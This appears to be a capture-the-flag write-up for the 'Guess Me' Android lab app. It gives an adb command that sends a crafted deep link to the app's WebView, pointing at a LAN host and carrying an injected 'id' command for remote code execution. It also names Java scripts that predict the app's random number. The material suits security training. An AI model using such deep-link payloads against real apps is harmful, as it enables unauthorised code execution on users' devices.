# Writeup for Guess me challenge.

## Objective
Exploit a Deep Link Vulnerability for Remote Code Execution: 
Your mission is to manipulate the deep link functionality in the "Guess Me" Android application, 
allowing you to execute remote code and gain unauthorized access.

## PoC RCE
First, run the Python script: `python3 server.py`

Once the server is up and running you should send the following payload:
```sh
adb shell am start -a android.intent.category.BROWSABLE \
-n com.mobilehackinglab.guessme/.WebviewActivity \
-d "mhl://mobilehackinglab/?url=http://192.168.0.210/search?Time=\'id\'%26q=mobilehackinglab.com"
```

## Random + timestamp
This is a very inconsistent way to bypass the Random function.

To run the script first compile the Java code : `javac -Xlint newGuessRandom.java`

Then run the script: `java -cp . newGuessRandom.java 2>/dev/nul`

It will take some time to find, but it works!

## Random + binary search
This way is a very consistent way of finding the guess number using a different approach.

To run the script, first compile the java code: `javac -Xlint newSuperGuessRandom.java`

To run the script: `java -cp . newSuperGuessRandom.java 2>/dev/null`
